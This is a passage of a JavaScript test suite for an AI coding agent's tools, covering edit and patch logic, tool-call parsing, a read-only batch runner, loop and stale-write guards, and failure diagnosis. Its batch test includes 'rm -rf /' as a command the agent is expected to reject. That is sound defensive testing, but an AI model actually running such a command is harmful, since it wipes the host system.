    { path: "src/other.js", content: "function parseDate(){}\nconst parser = 1\n" },
  ];
  const r = findReferences(files, "parse");
  eq("counts only whole-word usages (not parseDate/parser)", r.total, 6);
  eq("groups across 2 files", r.files, 2);
  ok("most-referenced file first", r.references[0].path === "src/app.js" && r.references[0].count === 4);
  ok("flags the definition line", r.definitions === 1);
  ok("flags the import line", r.imports >= 1);
  eq("classifyLine: declaration", classifyLine("export function parse(x){}", "parse"), "def");
  eq("classifyLine: import", classifyLine("import { parse } from './util'", "parse"), "import");
  eq("classifyLine: usage", classifyLine("  return parse(1)", "parse"), "usage");
  ok("rejects non-identifier input", !!findReferences(files, "parse(").error);
  ok("member access a.parse still counts as a usage", findReferences([{ path: "a.js", content: "obj.parse()\n" }], "parse").total === 1);
  ok("does not match substrings", findReferences([{ path: "a.js", content: "parseInt(x)\nparser()\n" }], "parse").total === 0);
  ok("empty symbol errors", !!findReferences(files, "").error);
  ok("miss returns a note, zero total", (() => { const z = findReferences(files, "nonexistentSym"); return z.total === 0 && !!z.note; })());
  ok("context lines are returned when asked", (() => { const c = findReferences([{ path: "a.js", content: "a\nparse()\nb\n" }], "parse", { context: 1 }); return c.references[0].hits[0].before[0] === "a" && c.references[0].hits[0].after[0] === "b"; })());
  ok("$ identifiers are escaped, not treated as regex", findReferences([{ path: "a.js", content: "const $el = 1\n$el.focus()\n" }], "$el").total === 2);
  ok("per-file cap truncates", (() => { const big = Array.from({ length: 200 }, () => "x()").join("\n"); const t = findReferences([{ path: "b.js", content: big.replace(/x\(\)/g, "ping()") }], "ping", { maxPerFile: 10 }); return t.truncated && t.references[0].hits.length === 10; })());
}

{
  group("code-intel (module_graph + outline)");
  const { parseImports, resolveSpec, buildImportGraph, moduleGraph } = require("../lib/nexus/code-intel");
  // parseImports across languages
  eq("js: import/require/dynamic specifiers", parseImports("a.js", "import x from './b'\nconst y = require('lodash')\nawait import('./c')\n"), ["./b", "lodash", "./c"]);
  eq("py: from + import", parseImports("a.py", "from .util import q\nimport os, sys\n"), [".util", "os", "sys"]);
  eq("go: single + block", parseImports("a.go", "import \"fmt\"\nimport (\n  \"os\"\n  \"./local\"\n)\n"), ["fmt", "os", "./local"]);
  // resolution against a known file set
  const fset = new Set(["src/a.js", "src/b.js", "src/sub/index.js", "pkg/util.py"]);
  eq("js relative resolves with extension", resolveSpec("./b", "src/a.js", fset), "src/b.js");
  eq("js relative resolves to index", resolveSpec("./sub", "src/a.js", fset), "src/sub/index.js");
  eq("js bare specifier is external (null)", resolveSpec("react", "src/a.js", fset), null);
  eq("py absolute resolves to module file", resolveSpec("pkg.util", "src/a.py", fset), "pkg/util.py");
  // graph over a tiny project
  const files = [
    { path: "src/app.js", content: "import { parse } from './util'\nimport './helper'\n" },
    { path: "src/helper.js", content: "import { parse } from './util'\n" },
    { path: "src/util.js", content: "import fs from 'fs'\nexport const parse = 1\n" },
    { path: "src/orphan.js", content: "console.log('nobody imports me')\n" },
  ];
  const whole = moduleGraph(files);
  eq("summary counts files", whole.files, 4);
  ok("util is the most-imported", whole.mostImported[0].path === "src/util.js" && whole.mostImported[0].importedBy === 2);
  ok("orphan + app are entry points (no importers)", whole.entryPoints.files.includes("src/orphan.js") && whole.entryPoints.files.includes("src/app.js"));
  const t = moduleGraph(files, "src/util.js");
  eq("target: external import listed", t.importsExternal, ["fs"]);
  ok("target: importedBy are app + helper", t.importedBy.length === 2 && t.fanIn === 2);
  const a2 = moduleGraph(files, "src/app.js");
  ok("target: internal imports resolved", a2.importsInternal.includes("src/util.js") && a2.importsInternal.includes("src/helper.js") && a2.fanOut === 2);
  ok("unknown target errors", !!moduleGraph(files, "nope.js").error);
  // buildImportGraph exposes both directions
  const g = buildImportGraph(files);
  ok("importedBy index is populated", g.importedBy["src/util.js"].length === 2);
}

{
  const { applyEdits, applyEditsFlexible, locateFlexible, parsePatch, applyHunks, applyPatch } = require("../lib/nexus/edit");
  // atomic multi-edit
  eq("multi-edit applies in order", applyEdits("a b c", [{ find: "a", replace: "x" }, { find: "c", replace: "z" }]).content, "x b z");
  ok("multi-edit is atomic: one bad edit touches nothing", (() => { const r = applyEdits("a b c", [{ find: "a", replace: "x" }, { find: "ZZZ", replace: "z" }]); return !r.ok && /not present/.test(r.error); })());
  ok("ambiguous find without replaceAll is an error", !applyEdits("a a a", [{ find: "a", replace: "x" }]).ok);
  eq("replaceAll replaces every occurrence", applyEdits("a a a", [{ find: "a", replace: "x", replaceAll: true }]).content, "x x x");
  ok("identical find/replace rejected", !applyEdits("abc", [{ find: "b", replace: "b" }]).ok);
  ok("empty edits list rejected", !applyEdits("abc", []).ok);
  // $-sequences in replacement text are literal, not regex substitutions (shell/regex/template code)
  eq("edit preserves $& in replacement", applyEdits("x = Y", [{ find: "Y", replace: "a$&b" }]).content, "x = a$&b");
  eq("edit preserves $$ in replacement", applyEdits("v = Z", [{ find: "Z", replace: "$$HOME" }]).content, "v = $$HOME");
  eq("flexible edit preserves $& in replacement", applyEditsFlexible("x = Y", [{ find: "Y", replace: "a$&b" }]).content, "x = a$&b");
  // flexible (whitespace-insensitive) single-match fallback
  const src = "function f() {\n    return   1;\n}\n";
  const fx = applyEditsFlexible(src, [{ find: "  return 1;", replace: "    return 2;" }]);
  ok("flexible match applies when only whitespace differs", fx.ok && fx.content.includes("return 2;") && fx.applied[0].mode === "flexible");
  ok("exact path is preferred and marked exact", (() => { const r = applyEditsFlexible("hello world", [{ find: "world", replace: "there" }]); return r.ok && r.content === "hello there" && r.applied[0].mode === "exact"; })());
  ok("flexible refuses when the block is ambiguous", (() => { const r = applyEditsFlexible("x=1\nx=1\n", [{ find: " x = 1 ", replace: "x=2" }]); return !r.ok; })());
  eq("locateFlexible finds a unique indentation-variant block", locateFlexible("a\n   foo()\nb", "foo()").count, 1);
  eq("locateFlexible reports missing", locateFlexible("a\nb\n", "zzz").count, 0);
  // unified diff
  const patch = ["--- a/f.js", "+++ b/f.js", "@@ -1,3 +1,3 @@", " line1", "-line2", "+LINE2", " line3"].join("\n");
  const pf = parsePatch(patch);
  eq("parsePatch: one file", pf.length, 1);
  eq("parsePatch: file name", pf[0].file, "f.js");
  eq("apply single-file patch anchors on context despite line drift", applyPatch("pre\nline1\nline2\nline3\npost\n", patch).content, "pre\nline1\nLINE2\nline3\npost\n");
  ok("patch context-not-found is an error", !applyPatch("totally different\n", patch).ok);
  ok("multi-file patch is parsed into two files", parsePatch(["diff --git a/x b/x", "--- a/x", "+++ b/x", "@@", "-a", "+b", "diff --git a/y b/y", "--- a/y", "+++ b/y", "@@", "-c", "+d"].join("\n")).length === 2);
  eq("applyHunks flexible-anchors a hunk whose context indentation differs", applyHunks("  keep\n    old\n  tail\n", [{ before: ["keep", "old"], after: ["keep", "new"] }]).content, "  keep\n  new\n  tail\n");
  eq("applyHunks preserves $ sequences in replacement", applyHunks("a\nkeep X\nb\n", [{ before: ["keep X"], after: ["new $& v"] }]).content, "a\nnew $& v\nb\n");
  eq("applyHunks keeps CRLF line endings consistent on a CRLF file", applyHunks("pre\r\nline1\r\nline2\r\npost\r\n", [{ before: ["line1", "line2"], after: ["line1", "LINE2"] }]).content, "pre\r\nline1\r\nLINE2\r\npost\r\n");
  eq("applyPatch on a CRLF file does not leave mixed endings", applyPatch("a\r\nkeep\r\nold\r\nb\r\n", ["--- a/f", "+++ b/f", "@@", " keep", "-old", "+new"].join("\n")).content, "a\r\nkeep\r\nnew\r\nb\r\n");
}

{
  const { detectProjectCommands, pickVerify, detectPackageManager } = require("../lib/nexus/verify");
  const pj = (obj) => ({ "package.json": JSON.stringify(obj) });
  eq("npm test from package.json scripts", detectProjectCommands(["package.json"], pj({ scripts: { test: "node t.js", build: "tsc" } })).test, "npm test");
  eq("pnpm run build when pnpm lock present", detectProjectCommands(["package.json", "pnpm-lock.yaml"], pj({ scripts: { build: "vite build" } })).build, "pnpm run build");
  eq("yarn test invocation", detectProjectCommands(["package.json", "yarn.lock"], pj({ scripts: { test: "jest" } })).test, "yarn test");
  eq("tsconfig implies a typecheck command", detectProjectCommands(["package.json", "tsconfig.json"], pj({ scripts: {} })).typecheck, "npx tsc --noEmit");
  eq("python: pytest from pyproject", detectProjectCommands(["pyproject.toml"], {}).test, "pytest -q");
  eq("python: pytest from a tests dir", detectProjectCommands(["tests", "app.py"], {}).test, "pytest -q");
  eq("rust: cargo test + build", (() => { const c = detectProjectCommands(["Cargo.toml"], {}); return c.test + "|" + c.build; })(), "cargo test|cargo build");
  eq("rust with a tests/ dir is still cargo, not pytest", (() => { const c = detectProjectCommands(["Cargo.toml", "src", "tests"], {}); return c.test + "|" + c.source; })(), "cargo test|cargo");
  eq("go with a test/ dir is still go test", detectProjectCommands(["go.mod", "test"], {}).test, "go test ./...");
  eq("go: test/build/vet", (() => { const c = detectProjectCommands(["go.mod"], {}); return [c.test, c.build, c.lint].join(","); })(), "go test ./...,go build ./...,go vet ./...");
  eq("make test only when target exists", detectProjectCommands(["Makefile"], { "Makefile": "build:\n\tcc x\ntest:\n\t./t\n" }).test, "make test");
  ok("make with no test target yields no test", !detectProjectCommands(["Makefile"], { "Makefile": "all:\n\tcc x\n" }).test);
  eq("package.json wins over python when both present", detectProjectCommands(["package.json", "pyproject.toml"], pj({ scripts: { test: "x" } })).test, "npm test");
  eq("pickVerify prefers test over build", pickVerify({ build: "make", test: "npm test" }), { kind: "test", cmd: "npm test" });
  eq("pickVerify falls back to build", pickVerify({ build: "cargo build", lint: "x" }), { kind: "build", cmd: "cargo build" });
  eq("pickVerify null when nothing detected", pickVerify({}), null);
  eq("package manager detection", [detectPackageManager(["yarn.lock"]), detectPackageManager(["pnpm-lock.yaml"]), detectPackageManager([])].join(","), "yarn,pnpm,npm");
  eq("empty project detects nothing", detectProjectCommands([], {}), {});
}

// ===================== native tool-calling (structured) =====================
{
  const NT = require("../lib/nexus/native-tools");
  // provider tool-spec shapes
  const a = NT.toAnthropicTools(["read_file"])[0];
  eq("anthropic tool spec shape", [a.name, !!a.input_schema, a.input_schema.type, a.input_schema.required[0]], ["read_file", true, "object", "path"]);
  const o = NT.toOpenAITools(["run_command"])[0];
  eq("openai tool spec shape", [o.type, o.function.name, o.function.parameters.required[0]], ["function", "run_command", "command"]);
  ok("ollama tools == openai tools shape", JSON.stringify(NT.toOllamaTools(["read_file"])) === JSON.stringify(NT.toOpenAITools(["read_file"])));
  ok("buildToolList defaults to all built-ins", NT.buildToolList().length === Object.keys(NT.TOOL_SCHEMAS).length);
  ok("MCP tool with its own schema passes through", NT.toOpenAITools([{ name: "mcp__x__y", description: "d", input_schema: { type: "object", properties: { q: {} } } }])[0].function.parameters.properties.q !== undefined);
  // safeArgs: object / json string / garbage / array
  eq("safeArgs object", NT.safeArgs({ path: "a" }), { path: "a" });
  eq("safeArgs json string", NT.safeArgs('{"path":"a"}'), { path: "a" });
  eq("safeArgs garbage -> {}", NT.safeArgs("not json"), {});
  eq("safeArgs array -> items", NT.safeArgs([1, 2]), { items: [1, 2] });
  // reply parsing per provider -> one shape
  eq("parse ollama tool_call (args object)", NT.parseOllamaReply({ message: { content: "", tool_calls: [{ function: { name: "read_file", arguments: { path: "a.js" } } }] } }).toolCalls[0], { id: "call_0", name: "read_file", args: { path: "a.js" } });
  eq("parse openai tool_call (args json string)", NT.parseOpenAIReply({ choices: [{ finish_reason: "tool_calls", message: { content: null, tool_calls: [{ id: "x", function: { name: "run_command", arguments: '{"command":"ls"}' } }] } }] }).toolCalls[0], { id: "x", name: "run_command", args: { command: "ls" } });
  eq("parse anthropic tool_use", NT.parseAnthropicReply({ stop_reason: "tool_use", content: [{ type: "tool_use", id: "tu", name: "verify", input: {} }] }).toolCalls[0], { id: "tu", name: "verify", args: {} });
  const fin = NT.parseAnthropicReply({ stop_reason: "end_turn", content: [{ type: "text", text: "all set" }] });
  eq("text-only reply is done", [fin.text, fin.toolCalls.length, fin.done], ["all set", 0, true]);
  eq("normalizeReply routes by provider", NT.normalizeReply("openai", { choices: [{ message: { content: "hi" } }] }).text, "hi");
  // follow-up message builders
  const at = NT.anthropicAssistantTurn("thinking", [{ id: "t1", name: "read_file", args: { path: "a" } }]);
  eq("anthropic assistant turn has text + tool_use", [at.role, at.content[0].type, at.content[1].type, at.content[1].id], ["assistant", "text", "tool_use", "t1"]);
  eq("anthropic tool results shape", NT.anthropicToolResults([{ id: "t1", content: "out" }]).content[0], { type: "tool_result", tool_use_id: "t1", content: "out", is_error: false });
  const oa = NT.openaiAssistantTurn("", [{ id: "c1", name: "list_dir", args: { path: "." } }]);
  eq("openai assistant turn tool_calls[].function.arguments is a string", typeof oa.tool_calls[0].function.arguments, "string");
  eq("openai tool result shape", NT.openaiToolResult("c1", "out"), { role: "tool", tool_call_id: "c1", content: "out" });
  // view_image is registered as a built-in tool and exposes its path schema
  ok("view_image is a registered built-in tool", !!NT.TOOL_SCHEMAS.view_image && NT.TOOL_SCHEMAS.view_image.required[0] === "path");
  ok("view_image is listed by buildToolList (all built-ins)", NT.buildToolList().some((t) => t.name === "view_image"));
}

// ===================== view_image (local image -> vision content block) =====================
group("view_image (base64 a local image for a multimodal model)");
{
  const VI = require("../lib/nexus/view-image");
  // MIME inference from the extension (pure)
  eq("mimeForExt png/jpg/jpeg/gif/webp/bmp/svg",
    ["a.png", "b.JPG", "c.jpeg", "d.gif", "e.webp", "f.bmp", "g.svg"].map((p) => VI.mimeForExt(p)),
    ["image/png", "image/jpeg", "image/jpeg", "image/gif", "image/webp", "image/bmp", "image/svg+xml"]);
  eq("mimeForExt rejects a non-image extension", VI.mimeForExt("notes.txt"), "");
  // provider content-block shapes
  const bl = VI.imageBlocks("image/png", "QUJD");
  eq("anthropic image block shape", bl.anthropic, { type: "image", source: { type: "base64", media_type: "image/png", data: "QUJD" } });
  eq("openai image_url block shape", bl.openai, { type: "image_url", image_url: { url: "data:image/png;base64,QUJD" } });
  // path-escape guard is REUSED (injected rp()): a throwing resolver is surfaced as an error, not a crash
  const escaped = VI.viewImageTool({ path: "../secrets.png" }, "/repo", (p) => { throw new Error("path escapes the project directory: " + p); });
  ok("view_image rejects a path that escapes the project directory", escaped && /escapes the project directory/.test(escaped.error));
  ok("view_image rejects a missing path", VI.viewImageTool({}, "/repo", (p) => p).error && /needs a 'path'/.test(VI.viewImageTool({}, "/repo", (p) => p).error));
  ok("view_image rejects an unsupported type", /unsupported image type/.test(VI.viewImageTool({ path: "a.txt" }, "/repo", (p) => p).error));
  // a real tiny PNG fixture: infers MIME, base64-encodes, builds the vision payload
  const png64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
  const vdir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-img-"));
  const vfile = path.join(vdir, "shot.png");
  fs.writeFileSync(vfile, Buffer.from(png64, "base64"));
  const r = VI.viewImageTool({ path: vfile }, vdir, (p) => p); // identity resolver: fixture path is already absolute
  ok("view_image loads the fixture ok", r.ok === true && r.media_type === "image/png" && r.bytes > 0 && r.encoding === "base64");
  ok("view_image base64-encodes the bytes under __vision", r.__vision && r.__vision.b64 === png64);
  ok("view_image builds both provider vision blocks", r.__vision.anthropic.source.media_type === "image/png" && /^data:image\/png;base64,/.test(r.__vision.openai.image_url.url));
  // size cap: injectable maxBytes refuses an oversized image with a clear message (no 10MB fixture needed)
  const big = VI.viewImageTool({ path: vfile }, vdir, (p) => p, { maxBytes: 1 });
  ok("view_image refuses an image over the size limit", big.error && /too large/.test(big.error));
  fs.rmSync(vdir, { recursive: true, force: true });
}

// ===================== default local coder (qwen2.5-coder ships with Nexus) =====================
{
  const { chooseCoderToPull, DEFAULT_CODER, pickCoderModel } = require("../lib/nexus/ollama");
  eq("default coder is qwen2.5-coder", DEFAULT_CODER, "qwen2.5-coder");
  eq("no models installed -> pull the default coder", chooseCoderToPull([]), "qwen2.5-coder");
  ok("qwen2.5-coder installed -> pull nothing", chooseCoderToPull(["qwen2.5-coder:latest"]) === null);
  ok("gpt-oss installed -> pull nothing", chooseCoderToPull(["gpt-oss:20b"]) === null);
  ok("darknode persona counts as capable -> pull nothing", chooseCoderToPull(["darknode-13b:latest"]) === null);
  eq("only a general chat model -> still pull the coder", chooseCoderToPull(["llama3.1:8b", "phi3:mini"]), "qwen2.5-coder");
  eq("pickCoderModel returns qwen2.5-coder when it's what's installed", pickCoderModel(["qwen2.5-coder:7b"]), "qwen2.5-coder:7b");
}

group("auto-update (Claude-Code-style self-update)");
ok("semverGt: patch/minor/major", semverGt("2.46.0", "2.45.0") && semverGt("2.10.0", "2.9.0") && semverGt("3.0.0", "2.99.9"));
ok("semverGt: not greater when equal or older", !semverGt("2.45.0", "2.45.0") && !semverGt("2.45.0", "2.46.0"));
ok("semverGt: shorter version, numeric only", semverGt("2.45.1", "2.45") && !semverGt("2.45", "2.45.0"));
ok("autoUpdateMode: default on; unknown -> on", autoUpdateMode(null) === "on" && autoUpdateMode({}) === "on" && autoUpdateMode({ autoUpdate: "weird" }) === "on");
ok("autoUpdateMode: honours check/off", autoUpdateMode({ autoUpdate: "check" }) === "check" && autoUpdateMode({ autoUpdate: "off" }) === "off");
ok("shouldCheck: off disables; offline disables", !shouldCheck({ autoUpdate: "off" }, 1e12, false) && !shouldCheck({ autoUpdate: "on" }, 1e12, true));
ok("shouldCheck: first launch runs; throttled within 4h; runs after", shouldCheck({}, 1e12, false) && !shouldCheck({ lastUpdateCheck: 1e12 - 1000 }, 1e12, false) && shouldCheck({ lastUpdateCheck: 1e12 - 5 * 3600 * 1000 }, 1e12, false));

(async () => {
  // batch tool — many read-only lookups in ONE call; reuses the real dispatcher (injected
  // here as a fake), labels every result, caps op count + output, and isolates bad ops.
  group("batch (one call, many read-only lookups)");
  try {
    const BA = require("../lib/nexus/batch");
    // a fake read-only dispatcher standing in for deviceTool's read_file/search/find/list_dir
    const fakeDispatch = async (name, args) => {
      if (name === "read_file") return args.path === "missing" ? { error: "ENOENT" } : { content: "L1\nL2\nL3\nL4\nL5" };
      if (name === "search") return { matches: ["a.js:1: hit", "b.js:9: hit"] };
      if (name === "find") return { files: ["x.js", "y.js"] };
      if (name === "list_dir") return { items: ["src/", "README.md"] };
      return { error: "unexpected tool " + name };
    };
    const multi = await BA.runBatch([
      { op: "read", path: "a.js" },
      { op: "search", pattern: "TODO" },
      { op: "glob", glob: "**/*.js" },
      { op: "list", path: "src" },
    ], fakeDispatch);
    ok("batch runs several ops and returns one result per op", multi.ran === 4 && multi.results.length === 4);
    ok("batch labels each result with its index + op kind", multi.results.map((r) => r.op).join(",") === "read,search,glob,list" && multi.results.every((r, i) => r.index === i));
    ok("batch read returns file content; search/glob/list join their lists", /L1\nL2/.test(multi.results[0].output) && /a\.js:1: hit/.test(multi.results[1].output) && multi.results[2].output === "x.js\ny.js" && multi.results[3].output === "src/\nREADME.md");

    // read line-range slicing
    const ranged = await BA.runBatch([{ op: "read", path: "a.js", start: 2, end: 3 }], fakeDispatch);
    ok("batch read honours a start/end line range", ranged.results[0].output === "L2\nL3");

    // op cap enforced
    const many = Array.from({ length: 25 }, () => ({ op: "list", path: "." }));
    const capped = await BA.runBatch(many, fakeDispatch, { maxOps: 20 });
    ok("batch enforces the op cap and reports dropped ops", capped.ran === 20 && capped.opsDropped === 5 && capped.ops === 25);

    // output-size cap enforced (tiny budget so a single result overflows)
    const bigDispatch = async () => ({ content: "Z".repeat(5000) });
    const sized = await BA.runBatch([{ op: "read", path: "big1" }, { op: "read", path: "big2" }], bigDispatch, { maxOpChars: 4000, maxTotalChars: 4500 });
    ok("batch caps per-op output length", sized.results[0].output.length === 4000 && /showing lines 1-1 — read again with start:2/.test(sized.results[0].truncated));
    const lineDispatch = async () => ({ content: Array.from({ length: 900 }, (_, k) => "line " + (k + 1)).join("\n"), from: 100 });
    const cut = await BA.runBatch([{ op: "read", path: "f", start: 100 }], lineDispatch, { maxOpChars: 120 });
    ok("a cut read ends on a whole line and says where to continue", /^line 1\n/.test(cut.results[0].output) && !/\n$/.test(cut.results[0].output) && /showing lines 100-\d+ — read again with start:\d+/.test(cut.results[0].truncated));
    ok("batch caps total output across ops", (sized.results[0].output.length + sized.results[1].output.length) <= 4500 && sized.truncated === true);

    // an invalid op is reported without failing the whole batch
    const mixed = await BA.runBatch([
      { op: "read", path: "a.js" },
      { op: "run_command", command: "rm -rf /" },
      { op: "write", path: "x", content: "y" },
      { op: "search", pattern: "x" },
    ], fakeDispatch);
    ok("batch isolates an invalid/unsafe op and still runs the valid ones", mixed.ran === 4 && mixed.results[0].output && /unknown or non-read-only/.test(mixed.results[1].error) && /unknown or non-read-only/.test(mixed.results[2].error) && mixed.results[3].output);
    ok("batch never executes a non-read-only op (write/exec rejected pre-dispatch)", !BA.OP_ALIASES.run_command && !BA.OP_ALIASES.write && !BA.OP_ALIASES.write_file);
    // inherited object members must not resolve to a truthy alias (null-proto whitelist)
    ok("batch op whitelist is prototype-safe (constructor/toString are unknown ops)", BA.OP_ALIASES.constructor === undefined && BA.OP_ALIASES.toString === undefined && BA.OP_ALIASES.valueOf === undefined);
    const proto = await BA.runBatch([{ op: "constructor" }, { op: "toString" }, { op: "read", path: "a.js" }], fakeDispatch);
    ok("batch rejects a prototype-named op instead of dispatching it", /unknown or non-read-only/.test(proto.results[0].error) && /unknown or non-read-only/.test(proto.results[1].error) && proto.results[2].output);

    // a dispatcher error for one op is reported inline, not thrown
    const errd = await BA.runBatch([{ op: "read", path: "missing" }, { op: "read", path: "a.js" }], fakeDispatch);
    ok("batch surfaces a per-op dispatcher error without aborting the batch", errd.results[0].error === "ENOENT" && /L1/.test(errd.results[1].output));

    // batchTool wiring entry validates its args
    const bad = await BA.batchTool({}, ".", fakeDispatch);
    ok("batchTool rejects a missing/empty ops array", bad && /non-empty 'ops'/.test(bad.error));
    const viaTool = await BA.batchTool({ ops: [{ op: "list", path: "." }] }, ".", fakeDispatch);
    ok("batchTool runs ops through the injected dispatcher", viaTool.ran === 1 && viaTool.results[0].output === "src/\nREADME.md");
  } catch (e) { ok("batch test threw: " + (e && e.message), false); }

  // loop guard — detects the agent getting stuck (same action repeated/failing, or A,B,A,B
  // oscillation), nudges first, then breaks the turn. Pure + deterministic.
  group("loop guard (stuck-loop detection)");
  try {
    const LG = require("../lib/nexus/loopguard");
    // signature is stable for the same action and distinguishes different args / tools.
    const s1 = LG.signature("run_command", { command: "npm test" });
    const s2 = LG.signature("run_command", { command: "npm test" });
    const s3 = LG.signature("run_command", { command: "npm run build" });
    const s4 = LG.signature("read_file", { path: "a.js" });
    ok("signature is identical for the same tool+args", s1 === s2);
    ok("signature differs when the command differs", s1 !== s3);
    ok("signature differs across tools", s1 !== s4);
    ok("signature hashes long content so near-identical bodies differ", LG.signature("write_file", { path: "x", content: "A".repeat(200) }) !== LG.signature("write_file", { path: "x", content: "B".repeat(200) }));

    // repeat-FAILURE: same action failing twice -> nudge; a third failure -> break.
    const g1 = LG.makeLoopGuard();
    const sg = g1.signature("run_command", { command: "pytest" });
    ok("first failure is not flagged", g1.note(sg, false) === null);
    const n1 = g1.note(sg, false);
    ok("second identical failure triggers a nudge", n1 && n1.action === "nudge" && n1.kind === "repeat-failure");
    const b1 = g1.note(sg, false);
    ok("a further identical failure after the nudge breaks the turn", b1 && b1.action === "break" && b1.kind === "repeat-failure");

    // repeat of a (successful) action 3x -> nudge, then break.
    const g2 = LG.makeLoopGuard();
    const sr = g2.signature("read_file", { path: "same.js" });
    ok("1st repeat not flagged", g2.note(sr, true) === null);
    ok("2nd repeat not flagged", g2.note(sr, true) === null);
    const r3 = g2.note(sr, true);
    ok("3rd identical action nudges as a repeat", r3 && r3.action === "nudge" && r3.kind === "repeat");
    const r4 = g2.note(sr, true);
    ok("4th identical action breaks the turn", r4 && r4.action === "break" && r4.kind === "repeat");

    // oscillation A,B,A,B -> nudge.
    const g3 = LG.makeLoopGuard();
    const A = "toolA|path=a", B = "toolB|path=b";
    g3.note(A, true); g3.note(B, true); g3.note(A, true);
    const osc = g3.note(B, true);
    ok("A,B,A,B oscillation is detected and nudged", osc && osc.kind === "oscillation" && osc.action === "nudge");

    // distinct productive actions never trip the guard.
    const g4 = LG.makeLoopGuard();
    const verdicts = ["read_file|path=a", "edit_file|path=a", "run_command|command=npm test", "read_file|path=b"].map((s) => g4.note(s, true));
    ok("a sequence of distinct actions is never flagged", verdicts.every((v) => v === null));

    // reset clears history + nudge memory.
    const g5 = LG.makeLoopGuard();
    g5.note("x", false); g5.note("x", false); g5.reset();
    ok("reset clears state so the counter starts over", g5.note("x", false) === null);

    // outcome-aware: a genuine fix loop (same test command, DIFFERENT error each run) is
    // progress, not a stall — it must not break the turn.
    const g6 = LG.makeLoopGuard();
    const st = g6.signature("run_command", { command: "npm test" });
    const v6 = [g6.note(st, false, "err-A"), g6.note(st, false, "err-B"), g6.note(st, false, "err-C"), g6.note(st, false, "err-D")];
    ok("changing error each run is treated as progress (no nudge/break)", v6.every((v) => v === null));
    // but the SAME error repeated still trips the fail-stall (nudge then break).
    const g7 = LG.makeLoopGuard();
    const su = g7.signature("run_command", { command: "pytest" });
    ok("same-outcome 1st failure not flagged", g7.note(su, false, "same") === null);
    const n7 = g7.note(su, false, "same");
    ok("same-outcome 2nd failure nudges", n7 && n7.action === "nudge" && n7.kind === "repeat-failure");
    const b7 = g7.note(su, false, "same");
    ok("same-outcome 3rd failure breaks", b7 && b7.action === "break");
    // back-compat: omitting the outcome arg reproduces the old all-failures-count behaviour.
    const g8 = LG.makeLoopGuard();
    const sv = g8.signature("run_command", { command: "make" });
    g8.note(sv, false); const n8 = g8.note(sv, false);
    ok("no-outcome calls keep the original counting (nudge on 2nd failure)", n8 && n8.action === "nudge");
    // hashStr is exposed on the instance for the call site to build an outcome signature.
    ok("loopGuard exposes hashStr for outcome signatures", typeof g8.hashStr === "function" && g8.hashStr("a") !== g8.hashStr("b"));
  } catch (e) { ok("loop guard test threw: " + (e && e.message), false); }

  // stale-write guard — a full overwrite is refused if the file changed on disk since the
  // agent last read it, so a concurrent edit isn't silently clobbered.
  group("stale-write guard (filestate)");
  try {
    const FS2 = require("../lib/nexus/filestate");
    const fg = FS2.makeFileState();
    // never read -> never stale (nothing to clobber)
    ok("a file the agent never read is never stale", fg.checkOverwrite("/x/a.js", "anything").stale === false);
    // read, then overwrite with unchanged disk -> fine
    fg.recordRead("/x/a.js", "line1\nline2");
    ok("overwrite is allowed when disk still matches what was read", fg.checkOverwrite("/x/a.js", "line1\nline2").stale === false);
    // disk changed since the read -> stale, with a helpful reason
    const st = fg.checkOverwrite("/x/a.js", "line1\nCHANGED-EXTERNALLY");
    ok("overwrite is blocked when disk drifted since the read", st.stale === true && /changed on disk/.test(st.reason));
    // after we record our own write, our knowledge is current again -> not stale
    fg.recordWrite("/x/a.js", "line1\nCHANGED-EXTERNALLY");
    ok("recording a write refreshes knowledge so the next overwrite isn't flagged", fg.checkOverwrite("/x/a.js", "line1\nCHANGED-EXTERNALLY").stale === false);
    // a file that vanished from disk -> allow (recreate)
    ok("a file that no longer exists on disk can be recreated", fg.checkOverwrite("/x/a.js", null).stale === false);
    // hash distinguishes same-length different content and same-prefix content
    ok("hash distinguishes equal-length but different content", FS2.hashStr("AAAA") !== FS2.hashStr("AAAB"));
    ok("hash includes length so a prefix isn't equal to its extension", FS2.hashStr("AB") !== FS2.hashStr("ABAB"));
    // forget drops tracking for a path
    fg.recordRead("/x/b.js", "z"); fg.forget("/x/b.js");
    ok("forget() stops guarding a path", fg.checkOverwrite("/x/b.js", "different").stale === false);
  } catch (e) { ok("stale-write guard test threw: " + (e && e.message), false); }

  // failure diagnosis — classify command/test output into an actionable category + hint.
  group("failure diagnosis");
  try {
    const DG = require("../lib/nexus/diagnose");
    const cat = (out, code, cmd) => { const d = DG.diagnose(out, code, cmd); return d && d.category; };
    ok("clean success with no error text -> no diagnosis", DG.diagnose("all good\n", 0) === null);
    ok("command-not-found is detected", cat("bash: foobar: command not found", 127, "foobar") === "missing-command");
    ok("missing module is detected", cat("Error: Cannot find module 'express'", 1, "node app.js") === "missing-dependency");
    ok("python ModuleNotFoundError is detected", cat("ModuleNotFoundError: No module named 'requests'", 1) === "missing-dependency");
    ok("syntax error is detected with a location", cat("app.js:12:5: SyntaxError: Unexpected token", 1) === "syntax-error");
    ok("ENOENT is a no-such-path", cat("ENOENT: no such file or directory, open '/tmp/x'", 1) === "no-such-path");
    ok("permission denied is detected", cat("EACCES: permission denied, open '/etc/hosts'", 1) === "permission");
    ok("port-in-use is detected", cat("Error: listen EADDRINUSE: address already in use :::3000", 1) === "port-in-use");
    const net = DG.diagnose("request to https://x failed, reason: ECONNREFUSED", 1);
    ok("network failures are detected and flagged transient", net.category === "network" && net.transient === true);
    ok("failing tests are detected", cat("Tests: 3 failed, 10 passed\nAssertionError: expected 1 to equal 2", 1) === "test-failure");
    ok("a passing suite reporting '0 failed' on exit 0 is NOT a test-failure", DG.diagnose("test result: ok. 10 passed; 0 failed; 0 ignored", 0, "cargo test") === null);
    ok("a counted failure still reports the right number", (DG.diagnose("=== 2 failed, 8 passed ===", 1) || {}).summary === "2 test(s) failing");
    ok("an unrecognized non-zero exit still yields nonzero-exit", cat("weird output with no pattern", 2) === "nonzero-exit");
    const d = DG.diagnose("bash: gcc: command not found", 127, "gcc x.c");
    ok("diagnosis carries a key line and a hint", /gcc/.test(d.line) && d.hint.length > 10);
    ok("annotate renders a compact [diagnosis] suffix", /^\n\n\[diagnosis\] /.test(DG.annotate(d)) && DG.annotate(null) === "");
  } catch (e) { ok("failure diagnosis test threw: " + (e && e.message), false); }

  // invariants — deterministic diff-lint: the agent runs its OWN diff through per-repo rules
